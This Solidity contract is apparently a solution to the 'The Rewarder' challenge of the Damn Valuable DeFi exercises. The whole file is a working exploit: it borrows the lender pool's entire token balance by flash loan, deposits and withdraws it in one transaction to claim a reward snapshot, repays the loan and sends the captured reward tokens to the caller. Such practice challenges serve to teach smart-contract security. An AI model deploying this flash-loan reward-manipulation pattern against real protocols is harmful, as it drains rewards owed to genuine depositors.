// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "./FlashLoanerPool.sol";
import "./AccountingToken.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewardAttack{
    FlashLoanerPool public flashloanerpool;
    DamnValuableToken public token;
    TheRewarderPool public therewarderpool;
    RewardToken public rewardtoken;

    constructor(
        address _flashloanerpool, address _token, address _therewarderpool, address _rewardtoken
    ){
        flashloanerpool = FlashLoanerPool(_flashloanerpool);
        token = DamnValuableToken(_token);
        therewarderpool = TheRewarderPool(_therewarderpool);
        rewardtoken = RewardToken(_rewardtoken);
    }

    fallback() external {
        uint balance = token.balanceOf(address(this));
        token.approve(address(therewarderpool), balance);
        therewarderpool.deposit(balance);
        therewarderpool.withdraw(balance);
        token.transfer(address(flashloanerpool),balance);
    }

    function attack() external{
        flashloanerpool.flashLoan(token.balanceOf(address(flashloanerpool)));
        rewardtoken.transfer(msg.sender,rewardtoken.balanceOf(address(this)));
    }
}
